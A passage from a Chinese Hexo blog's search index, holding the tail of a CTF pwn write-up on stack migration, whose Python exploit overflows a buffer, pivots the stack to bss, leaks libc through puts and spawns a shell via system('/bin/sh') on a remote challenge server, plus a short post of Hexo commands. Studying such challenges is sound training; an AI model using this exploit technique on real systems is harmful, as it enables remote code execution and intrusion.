class="hljs-comment">#注意\x00防止截断，否则出错。并且stack处不能填充b&#x27;/bin/sh&#x27;</span><br>p1 += p32(stack) + p32(leave)<br><br>io.send(p1)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="IDCV2">栈地址未知</h3>> 此时将栈迁移到bss段，或者需要利用read进行任意地址写。>> 与栈地址可知最大的区别：>> **通常第一次payload 的rip/eip填充的都是主函数代码复用read等片段**，此时需要注意**<font style="color:#7E45E8;">第二次payload填充时候是从fake_rbp-buf 地址开始写入，并且溢出字节依然有限</font>**，<font style="color:#D22D8D;">通常需要多次payload和使用leave地址。</font>><h4 id="wBSlt"><font style="color:rgb(33, 37, 41);">stack migration revenge</font></h4>> 题源：BUUCTF-PWN（ <font style="color:rgb(33, 37, 41);">[NewStarCTF 2023 公开赛道] </font>)><h5 id="feShf">源码</h5>反汇编得到主要功能函数代码<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123197057-70bd5a85-6479-452d-b04b-f13ca979ef22.png"></p><p>查看汇编代码获取调用read函数的代码段地址，便于后续利用read写入数据，同时减少了调用read_plt需要传参的问题。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123202931-fb0a2d97-986b-400b-8ca8-21b5269722cd.png"></p><p>查看可写代码段bss地址，选用大于0x404070并且小于0x405000的位置布置rop。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123206113-46d449c7-7853-4ba0-82d4-31a631690d24.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123628067-5bde1dff-294d-43c0-bfc4-f186a6749ad3.png"></p><h5 id="ap2uo">构造rop链</h5><h5 id="HZKCs">exp：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26923</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>offset = <span class="hljs-number">0x50</span><br><br>bss = <span class="hljs-number">0x405000</span>-<span class="hljs-number">0x900</span><br>read = <span class="hljs-number">0x4011ff</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>pop_rbp = <span class="hljs-number">0x40115d</span><br>leave = <span class="hljs-number">0x401227</span><br>pop_rdi = <span class="hljs-number">0x4012b3</span><br>ret = <span class="hljs-number">0x40101a</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset  + p64(bss+<span class="hljs-number">0x50</span>) + p64(read)<br>r.sendafter(<span class="hljs-string">b&#x27;just chat with me:\n&#x27;</span>,payload)<br><span class="hljs-comment"># 第二次payload会调用read从rbp-0x50即 bss地址开始写入</span><br><br>p2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>  + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)<br>p2 += p64(pop_rbp) + p64(bss+<span class="hljs-number">0x800</span>) + p64(read)<br>p2 = p2.ljust(offset,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(bss) + p64(leave)<br>r.sendafter(<span class="hljs-string">b&#x27;so funny\n&#x27;</span>,p2)<br> <span class="hljs-comment"># p64(bss) + p64(leave) :将rbp转到bss地址，此时栈结构：</span><br><br><span class="hljs-comment"># rbp     aaaaaaaa</span><br><span class="hljs-comment"># rip    p64(pop_rdi) + p64(puts_got) + p64(puts_plt)     -----leak_addr</span><br><span class="hljs-comment"># rip-&gt;rip    p64(pop_rbp) + p64(bss+0x800) + p64(read)</span><br><span class="hljs-comment">#       栈迁移第二个输入点，用于向 bss+0x750地址 填充system(/bin/sh)</span><br>r.recvuntil(<span class="hljs-string">b&#x27;so funny\n&#x27;</span>)<br>puts =u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts)<br>libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>payload =p64(pop_rdi) +p64(binsh_addr) +p64(system_addr)<br>payload =payload.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) +p64(bss +<span class="hljs-number">0x800</span> -<span class="hljs-number">0x58</span>) +p64(leave)<br><span class="hljs-comment"># 再次调转执行，从 bss+0x748开始，由于该地址为无关数据，有效地址从bss+0x750开始，因此 执行system(/bin/sh)</span><br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="o0gGi">pwn271</h4>参见 pwn 入门 wp，结合上面漏洞利用 32 位程序。]]></content>
    
    
    
    <tags>
      
      <tag>&lt;span class=&quot;label label-primary&quot;&gt;PWN&lt;/span&gt;</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>test</title>
    <link href="/2024/11/25/test/"/>
    <url>/2024/11/25/test/</url>
    
    <content type="html"><![CDATA[<p>以下是文章内容</p><h1 id="iframe插件"><a href="#iframe插件" class="headerlink" title="iframe插件"></a>iframe插件</h1><p><img src="/img/fluid.png"></p><p><img src="/images/test.png"></p><h1 id="Git-Bash"><a href="#Git-Bash" class="headerlink" title="Git Bash"></a>Git Bash</h1><h2 id="构建并推送更新到github-本地"><a href="#构建并推送更新到github-本地" class="headerlink" title="构建并推送更新到github&#x2F;本地"></a>构建并推送更新到github&#x2F;本地</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo c &amp;&amp; hexo g &amp;&amp; hexo d<br>或 hexo g -d<br></code></pre></td></tr></table></figure><h2 id="启动本地服务"><a href="#启动本地服务" class="headerlink" title="启动本地服务"></a>启动本地服务</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">hexo s(erver)<br></code></pre></td></tr></table></figure><h2 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h2><blockquote><p>修改文章后需要清除缓存，然后进行构建和推送</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo clean<br></code></pre></td></tr></table></figure><h2 id="参考fluid示例blog"><a href="#参考fluid示例blog" class="headerlink" title="参考fluid示例blog"></a>参考fluid示例blog</h2><h2 id="hexo命令行发布文章"><a href="#hexo命令行发布文章" class="headerlink" title="hexo命令行发布文章"></a>hexo命令行发布文章</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo new <span class="hljs-built_in">test</span>  <span class="hljs-comment"># 创建新文章test,同时会创建/post/test文件夹用于存放使用的图片等资源</span><br></code></pre></td></tr></table></figure><h2 id="图片显示问题"><a href="#图片显示问题" class="headerlink" title="图片显示问题"></a>图片显示问题</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">在博客根目录<span class="hljs-selector-tag">source</span>文件下新建images文件夹，用于存放博客插入的图片 ，然后在文章中插入图片即可<br>格式为 !<span class="hljs-selector-attr">[图片名称]</span>(/images/xxx<span class="hljs-selector-class">.png</span>)<br>路径：/<span class="hljs-selector-tag">source</span>/<span class="hljs-selector-tag">img</span>  用来存放博客背景等图片<br></code></pre></td></tr></table></figure><p>如<img src="/images/1.png" alt="测试图片"><br><a href="https://arcsin2.cloud/2023/02/23/Hexo-%E5%8D%9A%E5%AE%A2%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E5%9B%BE%E7%89%87%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/#:~:text=%E9%A6%96%E5%85%88%EF%BC%8C%E6%A0%B9%E6%8D%AE%20Hexo%20%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%EF%BC%8C%E5%9C%A8%20_config.yaml%20%E5%B0%86%20post_asset_folder%20%E9%80%89%E9%A1%B9%E8%AE%BE%E4%B8%BA%20true,%E5%B0%B1%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%B0%86%E5%9B%BE%E7%89%87%E4%BF%9D%E5%AD%98%E5%88%B0%E4%B8%8E%E6%96%87%E4%BB%B6%E5%90%8D%E5%90%8C%E5%90%8D%E7%9A%84%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E5%B9%B6%E5%9C%A8%20Markdown%20%E4%B8%AD%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%BC%95%E7%94%A8%E5%9B%BE%E7%89%87%E3%80%82%20%E8%BF%99%E6%A0%B7%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%9C%A8%20Hexo%20%E5%8D%9A%E5%AE%A2%E5%92%8C%20Typora%20%E4%B8%AD%E5%90%8C%E6%97%B6%E7%9C%8B%E5%88%B0%E5%9B%BE%E7%89%87%E3%80%82">参考</a></p><h2 id="其他小问题"><a href="#其他小问题" class="headerlink" title="其他小问题"></a>其他小问题</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 开启代理查看博客时候显示会有点问题...<br><span class="hljs-bullet">2.</span> 远程部署的字体偏小，先凑合看吧..<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>&lt;span class=&quot;label label-info&quot;&gt;others&lt;/span&gt;</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
